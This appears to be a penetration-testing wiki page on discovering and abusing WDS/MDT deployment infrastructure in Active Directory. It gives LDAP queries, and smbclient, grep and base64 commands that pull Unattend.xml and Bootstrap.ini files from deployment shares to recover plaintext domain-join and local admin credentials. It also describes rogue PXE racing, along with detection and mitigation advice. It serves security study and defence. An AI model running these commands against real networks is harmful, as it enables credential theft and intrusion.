---
title: WDS/MDT Discovery & Abuse
type: concept
created: 2026-06-13
updated: 2026-06-13
tags: [active-directory, wds, mdt, credential-access, deployment]
---

# WDS/MDT Discovery & Abuse

Windows Deployment Services (WDS) and the Microsoft Deployment Toolkit
(MDT) automate OS deployment. They register Service Connection Points (SCPs)
in AD, and store deployment configs (including domain-join creds) in
plaintext-adjacent files on SMB shares — both readable by any authenticated
user by default.

## Service discovery (LDAP)

WDS/MDT servers create `intellimirrorSCP`/`serviceConnectionPoint` objects
with attributes like `netbootServer`, queryable by any authenticated user:

```
(objectClass=intellimirrorSCP)
(&(objectclass=connectionPoint)(netbootserver=*))
```

## Credential harvesting (unattend files)

Deployment configs (`Unattend.xml`, `Bootstrap.ini`) on open shares like
`DeploymentShare$` frequently contain cleartext or base64 creds for:

- **Domain join accounts** — used to add new machines to the domain
- **Local administrator** — initial password for built-in admin

## Commands

```bash
# --- SCP discovery (any authenticated user) ---
ldapsearch -x -H ldap://<dc-ip> -D 'DOMAIN\user' -w password \
  -b "DC=corp,DC=local" "(objectClass=intellimirrorSCP)" netbootServer

# Or via PowerView
```
```powershell
Get-DomainObject -LDAPFilter "(&(objectclass=connectionPoint)(netbootserver=*))" -Properties netbootserver,distinguishedname
```

```bash
# --- Find and pull deployment shares ---
smbclient -L //<wds-server-ip> -U 'DOMAIN\user%password'
smbclient //<wds-server-ip>/DeploymentShare$ -U 'DOMAIN\user%password'

# Pull and grep unattend/bootstrap files for creds
smbclient //<wds-server-ip>/DeploymentShare$ -U 'DOMAIN\user%password' \
  -c 'recurse;prompt;mget *Unattend.xml *Bootstrap.ini *.xml'

grep -iE "password|<Value>" Unattend.xml Bootstrap.ini
# Passwords are often base64 (and sometimes reversed) - decode candidates:
echo "<b64string>" | base64 -d
```

```bash
# --- WDS image/PXE extraction (wdsfilecrawler / wdsmanage) ---
python3 wdsfilecrawler.py <wds-server-ip>
```

## PXE spoofing/racing

An attacker who's located the legitimate WDS server can race its DHCP/PXE
response with a rogue one, redirecting clients to a malicious deployment
environment to capture images or creds. (Compare [[sccm-abuse]]'s PXEThief
attack against SCCM's PXE boot media.)

## Prerequisites

- WDS/MDT integrated with AD (SCPs present).
- Standard authenticated-user LDAP read rights (default).
- Deployment shares left readable to Domain Users (common default).

## Detection

- **Honey-SCPs** — fake `intellimirrorSCP` objects, alert on LDAP queries
  targeting them.
- File-access auditing on `Unattend.xml`/`Bootstrap.ini`.
- DHCP Snooping / port security to catch rogue PXE servers.

## Mitigations

- **Migrate off MDT** — officially retired early 2026; move to Autopilot or
  MECM.
- Never store plaintext creds in unattend files; scope domain-join accounts
  to a single OU with minimum rights.
- ACL-restrict read access to `intellimirrorSCP` objects.
- Isolate deployment traffic on a dedicated VLAN.

## Links

- [[sccm-abuse]] — sibling deployment-infra attack surface (SCCM/MECM PXE +
  NAA creds)
- [[acl-abuse]] — SCP read-restriction is the same ACL-hardening primitive

## References

- [hideandsec.sh: MDT, where are you?](https://hideandsec.sh/books/windows/page/active-directory)
- [Microsoft: WDS and Service Connection Points](https://learn.microsoft.com/en-us/windows/win32/ad/service-connection-points)
- [Pentestlab: Credential Harvesting - Unattend Files](https://pentestlab.blog/2017/04/19/credential-harvesting-unattend-xml/)
</content>
